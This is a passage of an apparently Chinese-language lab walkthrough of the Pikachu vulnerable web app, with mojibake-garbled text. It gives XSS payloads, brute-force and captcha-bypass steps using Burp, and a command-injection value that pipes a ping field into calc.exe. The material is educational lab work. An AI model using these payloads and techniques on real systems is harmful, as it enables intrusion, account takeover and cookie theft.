id=\"è¿‡ç¨‹-3\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-3\">#</a> è¿‡ç¨‹</h3>\n<p>â€‹\tç›´æ¥æä¸ªè¶…é“¾æ¥ï¼Œç•™è¨€åˆ—è¡¨ç‚¹å‡»è·³è½¬</p>\n<p><img src=\"pikachu-xss-003.png\" alt=\"\"></p>\n<script>alert(1)</script> çš„è¯ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¼šå¼¹çª—\n<hr>\n<h2 id=\"domå‹\"><a class=\"markdownIt-Anchor\" href=\"#domå‹\">#</a> dom å‹</h2>\n<p>click ä¸€ä¸‹ï¼Œå‘ç°è¶…é“¾æ¥çš„è·³è½¬æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç›´æ¥é—­åˆå°±å¯</p>\n<h3 id=\"è¿‡ç¨‹-4\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-4\">#</a> è¿‡ç¨‹</h3>\n<p><img src=\"pikachu-xss-004.png\" alt=\"\"></p>\n<p>å°è¯•ç”¨åŒå¼•å·é—­åˆçš„æ—¶å€™ï¼Œå°½ç„¶æ²¡æœ‰ä½œç”¨ï¼Ÿï¼Ÿï¼Ÿ</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a&quot;&gt;nhhh<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#</span></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-005.png\" alt=\"\"></p>\n<p>å…¨éƒ¨æ”¹æˆå•å¼•å· <code>a'&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code> ï¼š</p>\n<p><img src=\"pikachu-xss-006.png\" alt=\"\"></p>\n<p>ä½†æ˜¯ js è„šæœ¬æ²¡æœ‰ç”Ÿæ•ˆï¼Œå› ä¸ºæ²¡æœ‰è¿”å›ç»™æœåŠ¡å™¨ï¼Œæ‰€ä»¥åˆ·æ–°ä¹‹åæ›´æ”¹çš„ä¹Ÿæ²¡æœ‰äº†ï¼Œå¯ä»¥é€šè¿‡ onclick å¼¹çª—:</p>\n<p><code>a' onclick=&quot;alert(1)&quot;&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code></p>\n<p><img src=\"pikachu-xss-007.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"domå‹xss-x\"><a class=\"markdownIt-Anchor\" href=\"#domå‹xss-x\">#</a> dom å‹ xss-x</h2>\n<h3 id=\"è¿‡ç¨‹-5\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-5\">#</a> è¿‡ç¨‹</h3>\n<p>éšä¾¿è¾“å…¥ a åç‚¹æŒ‰é’®ï¼Œå‡ºç°ä¸€ä¸ªè¶…é“¾æ¥ï¼Œå‘ç°è¿™ä¸ªè¶…é“¾æ¥æœ‰ä¸€ä¸ªäº‹ä»¶ï¼Œè°ƒç”¨äº† domxss () å‡½æ•°ï¼ŒCtrl+F æ‰¾ä¸€ä¸‹ domxss çœ‹ js æºä»£ç ï¼Œç«Ÿç„¶è¿˜æœ‰è¿™ç§æ˜ç¤º</p>\n<p><img src=\"pikachu-xss-008.png\" alt=\"\"></p>\n<p>ç›´æ¥è¾“å…¥ï¼šâ€™ onclick=â€œalert (â€˜xssâ€™)â€&gt;</p>\n<p><img src=\"pikachu-xss-009.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xssä¹‹ç›²æ‰“\"><a class=\"markdownIt-Anchor\" href=\"#xssä¹‹ç›²æ‰“\">#</a> xss ä¹‹ç›²æ‰“</h2>\n<h3 id=\"è¿‡ç¨‹-6\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-6\">#</a> è¿‡ç¨‹</h3>\n<p>æ ¹æ®æç¤ºç™»å½•åå°ï¼Œå‘ç°æœ‰æˆ‘ä»¬æäº¤çš„æ•°æ®ï¼ˆè¿™é‡Œåªèƒ½æ˜¾ç¤ºä¸€ä¸ªæˆ‘ä»¬äº¤çš„æ•°æ®ï¼æ°”äººï¼‰ï¼Œæ‰€ä»¥å‰å°æäº¤</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>åå°å°±ä¼šè¢«å¼¹</p>\n<p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·å– cookieï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ²¡æœ‰è¯•</p>\n<p>(çˆ±é¸­ï¼Œæ€ä¹ˆèƒ½ä¸è¯•è¯•å‘¢ï½)</p>\n<hr>\n<h2 id=\"xssä¹‹è¿‡æ»¤\"><a class=\"markdownIt-Anchor\" href=\"#xssä¹‹è¿‡æ»¤\">#</a> xss ä¹‹è¿‡æ»¤</h2>\n<h3 id=\"è¿‡ç¨‹-7\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-7\">#</a> è¿‡ç¨‹</h3>\n<p>ç»è¿‡å¤šæ¬¡å°è¯•ï¼Œåº”æ˜¯è¿‡æ»¤äº† &lt; script å’Œå‰é¢æ‰€æœ‰å­—ç¬¦ï¼Œå¤§å°å†™å¯ä»¥ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨<a onclick=\"alert(1)\"></a></p>\n<hr>\n<h2 id=\"xssä¹‹htmlspecialcahrsæˆ‘æ€»æ˜¯ä»¥ä¸ºè‡ªå·±æ²¡ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#xssä¹‹htmlspecialcahrsæˆ‘æ€»æ˜¯ä»¥ä¸ºè‡ªå·±æ²¡ç»•è¿‡\">#</a> xss ä¹‹ htmlspecialcahrsï¼Œæˆ‘æ€»æ˜¯ä»¥ä¸ºè‡ªå·±æ²¡ç»•è¿‡</h2>\n<h3 id=\"è¿‡ç¨‹-8\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-8\">#</a> è¿‡ç¨‹</h3>\n<p>é»˜è®¤ä¸è¿‡æ»¤å•å¼•å·</p>\n<p>payloadï¼š</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"xssä¹‹hrefè¾“å‡º\"><a class=\"markdownIt-Anchor\" href=\"#xssä¹‹hrefè¾“å‡º\">#</a> xss ä¹‹ href è¾“å‡º</h2>\n<h3 id=\"è¿‡ç¨‹-9\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-9\">#</a> è¿‡ç¨‹</h3>\n<p>payload:</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javascript:alert(1)</span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-011.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xssä¹‹jsè¾“å‡º\"><a class=\"markdownIt-Anchor\" href=\"#xssä¹‹jsè¾“å‡º\">#</a> xss ä¹‹ js è¾“å‡º</h2>\n<h3 id=\"è¿‡ç¨‹-10\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-10\">#</a> è¿‡ç¨‹</h3>\n<p>çœ‹è¡¨å•å‘ç° js æœ‰ä¸ªåˆ¤æ–­ï¼Œè¾“å…¥ tmac ä¼šè¾“å‡ºä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥æ’å…¥ onclick=â€œalert (1)â€</p>\n<p><img src=\"pikachu-xss-012.png\" alt=\"\"></p>\n<p><img src=\"pikachu-xss-010.png\" alt=\"\"></p>\n<p>æ®è¯´å¯ä»¥é—­åˆï¼ŒæˆåŠŸå¼¹çª—</p>\n<p>payloadï¼š</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>é—­åˆåçš„ jsï¼š</p>\n<p><img src=\"pikachu-xss-013.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> æ€»ç»“</h2>\n<p><a href=\"https://blog.csdn.net/weixin_43899561/article/details/89429726\">å¤§ä½¬å†™çš„å…³äº xss æŠ“ cookie</a></p>\n<p><a href=\"https://www.fujieace.com/penetration-test/xss-100.html\">XSS è¿‡æ»¤ç»•è¿‡æ–¹æ³•</a></p>\n<p><a href=\"https://www.cnblogs.com/heiwa-0924/p/12520547.html\">é€šå…³æ‰‹å†Œï¼Œå†™å¾—æŒºå¥½</a></p>\n<hr>\n<h1 id=\"æ–‡ä»¶åŒ…å«\"><a class=\"markdownIt-Anchor\" href=\"#æ–‡ä»¶åŒ…å«\">#</a> æ–‡ä»¶åŒ…å«</h1>\n<p>æ–‡ä»¶åŒ…å«ä¹‹çœ‹ä¸æ‡‚è‡ªå·±åœ¨å†™ä»€ä¹ˆï¼Œæ‰€ä»¥æ— æ³•ä¸Šä¼ ç³»åˆ—</p>\n<p>çœ‹æ ·å­åº”è¯¥å°±æ˜¯åŸºç¡€çš„æ–‡ä»¶åŒ…å«é¸­ï½</p>\n<h2 id=\"æ€»ç»“-2\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-2\">#</a> æ€»ç»“ï¼š</h2>\n<p>æ–‡ä»¶åŒ…å«ï¼š</p>\n<blockquote>\n<p>æ–‡ä»¶åŒ…å«åœ¨ php ä¸­ï¼Œæ¶‰åŠåˆ°çš„å±é™©å‡½æ•°æœ‰å››ä¸ªï¼Œåˆ†åˆ«æ˜¯ include ()ã€include_once ()ã€require ()ã€require_once ()ã€‚</p>\n</blockquote>\n<p>åŒºåˆ«å¦‚ä¸‹ï¼š</p>\n<blockquote>\n<p>includeï¼šåŒ…å«å¹¶è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶å‘ç”Ÿé”™è¯¯æ—¶ï¼Œç¨‹åºè­¦å‘Šï¼Œä½†ä¼šç»§ç»­æ‰§è¡Œã€‚</p>\n<p>include_onceï¼šå’Œ include ç±»ä¼¼ï¼Œä¸åŒå¤„åœ¨äº include_once ä¼šæ£€æŸ¥è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å·²ç»è¢«å¯¼å…¥ï¼Œå¦‚æœå·²å¯¼å…¥ï¼Œä¸‹æ–‡ä¾¿ä¸ä¼šå†å¯¼å…¥ï¼Œç›´é¢ once ç†è§£å°±æ˜¯åªå¯¼å…¥ä¸€æ¬¡ã€‚</p>\n<p>requireï¼šåŒ…å«å¹¶è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶å‘ç”Ÿé”™è¯¯æ—¶ï¼Œç¨‹åºç›´æ¥ç»ˆæ­¢æ‰§è¡Œã€‚</p>\n<p>require_onceï¼šå’Œ require ç±»ä¼¼ï¼Œä¸åŒå¤„åœ¨äº require_once åªå¯¼å…¥ä¸€æ¬¡ã€‚</p>\n</blockquote>\n<hr>\n<h1 id=\"æš´åŠ›ç ´è§£\"><a class=\"markdownIt-Anchor\" href=\"#æš´åŠ›ç ´è§£\">#</a> æš´åŠ›ç ´è§£</h1>\n<h2 id=\"åŸºäºè¡¨å•çš„çˆ†ç ´\"><a class=\"markdownIt-Anchor\" href=\"#åŸºäºè¡¨å•çš„çˆ†ç ´\">#</a> åŸºäºè¡¨å•çš„çˆ†ç ´</h2>\n<h3 id=\"è¿‡ç¨‹-11\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-11\">#</a> è¿‡ç¨‹</h3>\n<p>â€‹\tbp æŠ“åŒ…ï¼Œintrude ç›´æ¥çˆ†å¯†ç ï¼Œç”¨æˆ·å adminã€‚</p>\n<p>â€‹\tæ ¹æ®æç¤ºï¼Œå‘ç°æœ‰ä¸‰ä¸ªè´¦å·ï¼š</p>\n<ul>\n<li>admin</li>\n<li>pikachu</li>\n<li>test</li>\n</ul>\n<p>å‰ä¸¤ä¸ªåº”è¯¥ç›´æ¥çŒœåˆ°çš„ï¼Œæœ€åä¸€ä¸ªè¿˜æ²¡è§è¿‡ï¼Œä¸è¿‡æ¶¨å§¿åŠ¿äº†ï¼Œåº”è¯¥éƒ½æ˜¯å¸¸ç”¨è´¦æˆ·åã€‚</p>\n<p>æƒ³äº†æƒ³ï¼Œç”¨ bp åŒæ—¶çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼ˆå°±æ˜¯é€Ÿåº¦å¤ªæ…¢äº†ï¼‰ï¼š</p>\n<p><img src=\"pikachu-baopo-003.png\" alt=\"pikachu-baopo-003\"></p>\n<p>pitchfork ä¹Ÿå¯ä»¥å•Š</p>\n<p><img src=\"pikachu-baopo-001.png\" alt=\"pikachu-baopo-001\"></p>\n<p>è¿™æ˜¯ç»™ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®å­—å…¸ï¼Œä½ è¿™ä¸ªçŒª<img src=\"pikachu-baopo-002.png\" alt=\"pikachu-baopo-002\"></p>\n<h2 id=\"éªŒè¯ç ç»•è¿‡on-server\"><a class=\"markdownIt-Anchor\" href=\"#éªŒè¯ç ç»•è¿‡on-server\">#</a> éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h2>\n<h3 id=\"è¿‡ç¨‹-12\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-12\">#</a> è¿‡ç¨‹</h3>\n<p>çœ‹æŠ“çš„åŒ…ï¼Œå‘ç°æŠŠç”¨æˆ·è¾“å…¥çš„éªŒè¯ç å’Œç”¨æˆ·åå¯†ç ä¸€èµ·å‘åˆ°æœåŠ¡å™¨äº†ï¼Œè€Œä¸”åœ¨ cookie é‡Œå‘ç°äº†éªŒè¯ç çš„å€¼ï¼Œæ‰€ä»¥åˆ¤æ–­æ˜¯éªŒè¯ç ç»•è¿‡ã€‚</p>\n<p><img src=\"pikachu-baopo-004.png\" alt=\"\"></p>\n<p>åŸºæœ¬è¿‡ç¨‹ï¼šå®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ -&gt; æœåŠ¡ç«¯å“åº”å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ SessionID åŒæ—¶ç”ŸæˆéšæœºéªŒè¯ç ï¼Œå°†éªŒè¯ç å’Œ SessionID ä¸€å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ -&gt; å®¢æˆ·ç«¯æäº¤éªŒè¯ç è¿åŒ SessionID ç»™æœåŠ¡ç«¯ -&gt; æœåŠ¡ç«¯éªŒè¯éªŒè¯ç åŒæ—¶é”€æ¯å½“å‰ä¼šè¯ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ç»“æœã€‚</p>\n<p>æ‰€ä»¥ç”¨ bp æ‹¦æˆªï¼Œä¸è®©é¡µé¢åˆ·æ–°ï¼Œå°±ä¸ä¼šé”€æ¯ä¼šè¯ï¼Œä¹Ÿä¸ä¼šæ›´æ–°éªŒè¯ç ï¼Œå°±å¯ä»¥ç”¨ bp çˆ†ç ´è¾£ï¼Œåœ¨ cookie ä¸­å¸¦å›ºå®šçš„ sessionID å’Œå›ºå®šçš„éªŒè¯ç å­—ç¬¦ä¸²</p>\n<p><img src=\"pikachu-baopo-005.png\" alt=\"\"></p>\n<h2 id=\"éªŒè¯ç ç»•è¿‡on-client\"><a class=\"markdownIt-Anchor\" href=\"#éªŒè¯ç ç»•è¿‡on-client\">#</a> éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h2>\n<h3 id=\"è¿‡ç¨‹-13\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-13\">#</a> è¿‡ç¨‹</h3>\n<p>åœ¨å‰å°æ‰¾åˆ°äº†éªŒè¯éªŒè¯ç çš„å‡½æ•°</p>\n<p><img src=\"pikachu-baopo-006.png\" alt=\"\"></p>\n<p>é€šè¿‡æœç´¢å‡½æ•°åï¼Œå®šä½æ‰§è¡Œå‡½æ•°çš„ä½ç½®ï¼ŒæŠŠè¿™ä¸ªäº‹ä»¶åˆ æ‰ï¼Œbp æŠ“åŒ…ï¼Œå‘ç°æœ‰ vcode å‚æ•°ï¼Œåˆ æ‰åˆ æ‰ï¼Œç›´æ¥çˆ†ç ´</p>\n<p>å†™å®Œ token å‘ç°ä¹Ÿå¯è‡ªåŠ¨åŒ–è·å–å‰ç«¯ä¿¡æ¯ï¼Œè¿›è¡Œçˆ†ç ´</p>\n<h2 id=\"tokené˜²çˆ†\"><a class=\"markdownIt-Anchor\" href=\"#tokené˜²çˆ†\">#</a> token é˜²çˆ†</h2>\n<h3 id=\"è¿‡ç¨‹-14\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-14\">#</a> è¿‡ç¨‹</h3>\n<p>token ä¸»è¦ç”¨æ¥é˜²å¾¡ csrfï¼Œè€Œæ— æ³•é˜²æ­¢æš´åŠ›ç ´è§£ã€‚</p>\n<p>è¿™æ˜¯å› ä¸ºå°†ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ token åŠ å…¥è¯·æ±‚ä¹‹åï¼Œæ¯æ¬¡è¯·æ±‚ token éƒ½ä¼šæ”¹å˜ã€‚</p>\n<p>csrf æ”»å‡»è€…åªèƒ½çªƒå–å—å®³è€…çš„ cookie å´ä¸èƒ½ä¼ªé€ å½“æ¬¡è¯·æ±‚çš„ tokenï¼Œtoken æ— æ³•é˜²æ­¢æš´åŠ›ç ´è§£çš„åŸå› æ˜¯ token æ¯æ¬¡éƒ½ä¼šéšé¡µé¢è¿”å›åˆ°å‰ç«¯ï¼Œæ”»å‡»è€…åªè¦æƒ³åŠæ³•__è‡ªåŠ¨åŒ–è·å¾—å‰ç«¯çš„ token__å³å¯è¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»ã€‚</p>\n<p>option ä¸­çš„ Grep -Extract: è¿™ä¸ªè®¾ç½®èƒ½å¤Ÿè¢«ç”¨æ¥é€šè¿‡è¯·æ±‚è¿”å›çš„ä¿¡æ¯æ¥è·å–æœ‰ç”¨çš„ä¿¡æ¯ä¾›ä½ ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥è·å¾—æ¯æ¬¡è¯·æ±‚åè¿”å›çš„ tokenï¼Œå…³è”åˆ° payload ä¸­è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p>\n<p><img src=\"pikachu-baopo-007.png\" alt=\"\"></p>\n<p>è¿™æ ·å°±è®¾ç½®å®Œæ¯•äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ burp çš„ Pichfork çˆ†ç ´æ¨¡å¼åªèƒ½è¿›è¡Œå•çº¿ç¨‹çš„çˆ†ç ´ï¼Œè®¾ç½®ä¸€ä¸‹çº¿ç¨‹ 1</p>\n<p><img src=\"pikachu-baopo-008.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-009.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-010.png\" alt=\"\"></p>\n<p>ç„¶åå¸¸è§„çˆ†ç ´å°±å¥½äº†</p>\n<h2 id=\"æ€»ç»“-3\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-3\">#</a> æ€»ç»“</h2>\n<p><strong>BurpSuite intruder attack-type 4 ç§çˆ†ç ´æ¨¡å¼ï¼š</strong></p>\n<p>Sniper å•å‚æ•°çˆ†ç ´ï¼Œå¤šå‚æ•°æ—¶åŒä¸€ä¸ªå­—å…¸æŒ‰é¡ºåºæ›¿æ¢å„å‚æ•°ï¼Œæ€»ä¹‹åˆå§‹å€¼æœ‰ä¸€ä¸ªå‚æ•°ä¸å˜</p>\n<p>Battering ram å¤šå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½†ç”¨çš„æ˜¯åŒä¸€ä¸ªå­—å…¸</p>\n<p>Pichfork å¤šå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½†ç”¨çš„æ˜¯ä¸åŒçš„å­—å…¸</p>\n<p>Cluster bamb å¤šå‚æ•°åšç¬›å¡å°”ä¹˜ç§¯æ¨¡å¼çˆ†ç ´</p>\n<p><a href=\"https://www.cnblogs.com/kllay/p/7136022.html\">bp çˆ†ç ´å„ç§ç±»å‹è§£è¯´</a></p>\n<p><a href=\"https://www.cnblogs.com/rnss/p/11233006.html\">token çœ‹çš„è¿™ä½å¤§ä½¬</a></p>\n<hr>\n<h1 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h1>\n<p><strong>æ¼æ´æ¦‚è¿°</strong></p>\n<blockquote>\n<p>RCEï¼ˆremote command/code executeï¼‰æ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p>\n<p>(æ¬ä¸€ä¸‹çš®å¡ä¸˜å“’ï¼Œå¯¹è¿™ä¸ªä¸æ˜¯å¾ˆç†Ÿæ‚‰)</p>\n</blockquote>\n<p><strong>è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</strong></p>\n<blockquote>\n<p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£<br>\næ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„ web ç®¡ç†ç•Œé¢ä¸Š</p>\n<p>ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ª ping æ“ä½œçš„ web ç•Œé¢ï¼Œç”¨æˆ·ä» web ç•Œé¢è¾“å…¥ç›®æ ‡ IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥ IP åœ°å€è¿›è¡Œä¸€æ¬¡ ping æµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤ â€œæ„æƒ³ä¸åˆ°â€ çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨</p>\n<p>ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´ï¼Œå¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡ &quot;è‡ªåŠ¨åŒ–è¿ç»´å¹³å°&quot; è¿›è¡Œæ“ä½œã€‚åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ï¼Œä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ &quot;æ”¶è·&quot;-_-</p>\n</blockquote>\n<p><strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong></p>\n<blockquote>\n<p>åŒæ ·çš„é“ç†ï¼Œå› ä¸ºéœ€æ±‚è®¾è®¡ï¼Œåå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œï¼Œä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼Œè¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚</p>\n<p>å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„ API æ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</p>\n<p>ä½ å¯ä»¥é€šè¿‡ â€œRCEâ€ å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</p>\n</blockquote>\n<h2 id=\"exec-ping\"><a class=\"markdownIt-Anchor\" href=\"#exec-ping\">#</a> exec â€œpingâ€</h2>\n<h3 id=\"è¿‡ç¨‹-15\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-15\">#</a> è¿‡ç¨‹</h3>\n<p>post æ–¹æ³•ï¼Œç”¨ç«ç‹æ‹¦æˆªé‡å‘ï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipaddress=jsdlvfdsfger | C:\\Windows\\System32\\calc.exe&amp;submit=ping</span><br></pre></td></tr></table></figure>\n<p>æˆåŠŸå¼¹å‡º</p>\n<h2 id=\"execeval\"><a class=\"markdownIt-Anchor\" href=\"#execeval\">#</a> exec&quot;eval&quot;</h2>\n<h3 id=\"è¿‡ç¨‹-16\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-16\">#</a> è¿‡ç¨‹</h3>\n<p>éšä¾¿è¾“ä¸€ä¸²å­—ç¬¦ä¸² phpinfo ()ï¼ŒæŠ¥é”™</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Parse error: syntax error, unexpected end of file in D:\\phpstudy_pro\\WWW\\pikachu\\vul\\rce\\rce_eval.php(19) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure>\n<p>åæ¥ç™¾åº¦å‘ç°ï¼š</p>\n<blockquote>\n<p>php çš„ eval å‡½æ•°æ˜¯ç”¨æ¥æŠŠä¸€æ®µæ–‡å­—å½“ä½œä¸€æ®µ php çš„è„šæœ¬æ¥æ‰§è¡Œï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯æˆ‘ä»¬å¯ä»¥åŠ¨æ€ä¿®æ”¹ php æ‰§è¡Œçš„å†…å®¹ã€‚</p>\n<p>ä»Šå¤©æƒ³å®ç°çš„åŠŸèƒ½æ˜¯ï¼šæ ¹æ®ä»æµè§ˆå™¨ get åˆ°çš„æ•°æ®ï¼Œä½¿ç”¨ eval () æ‰§è¡Œä¸åŒçš„å‡½æ•°ï¼š<br>\nif(isset(_GET['step'])){\neval(_GET[â€˜stepâ€™]);<br>\n}else{<br>\ncontent='\\<a href=\"?step=getipall\">ç¬¬ä¸€æ­¥ï¼šè·å–æ‰€æœ‰çš„ipåœ°å€\\</a>';\nmsg(content);<br>\n}</p>\n</blockquote>\n<p>æ³¨æ„ï¼Œè¿™ä¸ªä»£ç æ˜¯æœ‰å®‰å…¨é—®é¢˜çš„ï¼Œåƒä¸‡ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ã€‚</p>\n<p>è¿è¡Œä»¥ä¸Šä»£ç ï¼Œæç¤º â€œeval ()â€™d code on line 1â€ï¼Œæ ¹æ®æç¤ºæ¥çœ‹æ˜¯ eval 